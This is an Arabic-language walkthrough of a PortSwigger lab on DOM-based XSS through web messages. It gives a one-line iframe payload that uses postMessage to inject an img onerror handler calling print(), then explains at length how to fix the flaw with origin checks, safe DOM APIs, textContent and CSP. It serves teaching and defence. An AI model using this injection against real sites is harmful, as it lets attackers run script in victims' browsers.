# [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

## **`الهدف`**
استخدم سيرفر الاستغلال لإرسال رسالة إلى الموقع المستهدف، مما يؤدي إلى استدعاء دالة `print()`.
## **`خطوات الحل`**
سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.
```html
<iframe src="https://0a7a00530450299680df7652006f009a.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب. 
## **`ترقيع الثغرة`**
يجب التوقف عن تمرير المدخلات القادمة من المستخدم عبر رسائل الويب `Web Messages` وتحديداً من `event.data` مباشرة إلى مصبات غير آمنة `Sinks` مثل `innerHTML` والتي تقوم بدمج البيانات كأكواد `Raw HTML`، واستبدالها بواجهات `DOM` الآمنة مثل `document.createElement` لإنشاء العناصر.

ويجب التحقق من مصدر أي بيانات ديناميكية يتم استلامها عبر المستمع `EventListener` قبل معالجتها، وذلك باستخدام خاصية `event.origin` لضمان قدومها من نطاق موثوق، إلى جانب تعقيم المدخلات `Sanitization` لضمان تحويل أي رموز خاصة `Special Characters` إلى نصوص لا يمكن للمتصفح تفسيرها كـ `Payload` خبيث.

وإذا كان الهدف هو مجرد عرض محتوى الرسالة في واجهة المستخدم `Frontend`، فيجب على المبرمجين الاعتماد على خصائص آمنة مثل `textContent` والتي تتعامل مع المدخلات كنص عادي `Plain Text` فقط، وتمنع تفعيل أي وسم `Tag` خبيث مثل `img`.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة سياسة أمان المحتوى `CSP` صارمة تمنع تنفيذ أكواد `JS` المدمجة `Inline Scripts` أو المنفذة عبر أحداث مثل `onerror`، فحتى لو فشل المطور في تأمين الكود برمجياً ونجح المهاجم في حقن الكود، سيتدخل المتصفح ويمنع تنفيذ الـ `print()`.
